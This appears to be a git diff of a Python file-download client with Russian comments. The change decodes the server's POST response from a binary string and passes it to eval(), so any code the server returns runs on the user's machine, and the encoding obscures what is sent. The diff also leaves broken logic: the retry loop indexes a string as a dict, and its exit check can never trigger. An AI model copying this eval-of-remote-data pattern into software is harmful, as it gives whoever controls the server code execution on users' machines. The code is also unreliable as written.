@@ -9,6 +9,12 @@ import traceback
 
 mein_ulr=input('IP server>>')
 
+def binary_to_text(binary_str, encoding='utf-8'):
+    #Преобразует двоичную строку обратно в текст
+    # Разбиваем строку на части по 8 символов (1 байт)
+    bytes_list = [int(binary_str[i:i+8], 2) for i in range(0, len(binary_str), 8)]
+    return bytes(bytes_list).decode(encoding)
+
 
 try:
     a=requests.get(mein_ulr)
@@ -43,16 +49,16 @@ print(f"ping>>>{ping(url)}")
 try:
     # POST-запрос с JSON
     info_data = {'key': 'value'}
-    info = requests.post(info_url, json=info_data)
+    info = eval(binary_to_text(requests.post(info_url, json=info_data).json()))
     # Вывод POST-ответа
-    print('info:', info.json())
+    print('info:', info)
     #проверка сервера на коректность
-    if info.json()['key']>10 or info.json()['key']<0:
+    if info['key']>10 or info['key']<0:
         print('error server key conecting')
         for i in range(5):
-            info = requests.post(info_url, json=info_data)
+            info = binary_to_text(requests.post(info_url, json=info_data).json())
             time.sleep(1)
-            if info.json()['key']>10 or info.json()['key']<0:
+            if info['key']>10 or info['key']<0:
                 print('error server key conecting')
                 if i >=5:
                     exit('error server key conecting')
@@ -65,7 +71,7 @@ try:
     response = requests.get(file_list, params=params)
     files = response.json()  # Получаем данные из GET-запроса
 
-    file_download =tpg.listgr(files,title=info.json()['message'])
+    file_download =tpg.listgr(files,title=info['message'])
 
     params = {'file': file_download}
     bute = requests.get(url, params=params).json()
@@ -78,5 +84,6 @@ try:
     else:
         print('key data not found')
 except Exception as e:
-    print('error\n'+traceback.format_exc())
+    print('error>\n'+traceback.format_exc()+'\n')
+    input('press enter to exit')
 
